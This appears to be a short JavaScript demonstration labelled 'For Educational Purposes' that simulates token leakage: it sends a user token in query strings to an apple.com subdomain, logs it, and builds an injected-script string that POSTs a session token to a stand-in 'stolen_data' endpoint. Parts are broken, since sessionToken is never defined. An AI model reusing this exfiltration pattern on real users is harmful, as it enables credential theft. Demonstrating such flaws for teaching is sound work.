// For Educational Purposes
// For Educational Purposes
// For Educational Purposes
// For Educational Purposes
// For Educational Purposes
// For Educational Purposes


function simulateFakeTokenLeak() {
    const user = {
        username: 'can',
        email: 'canaltinturk@protonmail.com',
        password: '', 
        Token: 'af4d65s4f56dsDFc3',
        roles: ['admin', 'user'],
        lastLogin: '2024-12-05T12:00:00Z'
    };

    const apiUrls = [
        `https://ltesklnjf.apple.com/userinfo?token=${user.Token}`,
        `https://ltesklnjf.apple.com/settings?token=${user.Token}`,
        `https://ltesklnjf.apple.com/activitylog?token=${user.Token}`,
    ];

    console.log("Exposing fake token via console log:", user.Token);


    function makeFakeApiRequest(url) {
        fetch(url)
            .then(response => response.json())
            .then(data => {
                console.log("Data received from fake API:", data);
            })
            .catch(error => {
                console.error("Error during fake API request:", error);
            });
    }

    apiUrls.forEach(url => {
        console.log(`Sending request to: ${url}`);
        makeFakeApiRequest(url);
    });

    const fakeUrlWithToken = `https://example.com/dashboard?token=${user.sessionToken}`;
    console.log("Fake URL exposing token:", fakeUrlWithToken);

    console.log("Session expired for user:", user.username);
    console.log("Exposing expired token:", user.sessionToken);
    
    const maliciousScript = `
        <script>
            fetch('https://fakeapi.example.com/stolen_data', {
                method: 'POST',
                body: JSON.stringify({ token: '${user.sessionToken}' }),
                headers: { 'Content-Type': 'application/json' }
            }).then(response => response.json())
              .then(data => console.log('Data sent to malicious endpoint:', data));
        </script>
    `;
    console.log("Injecting fake malicious script:", maliciousScript);

    console.log("Sending data without encryption:", user.sessionToken);
    
    alert(`Exposing token: ${user.sessionToken}`);
}

simulateFakeTokenLeak();

// For Educational Purposes
// For Educational Purposes
// For Educational Purposes
// For Educational Purposes
// For Educational Purposes
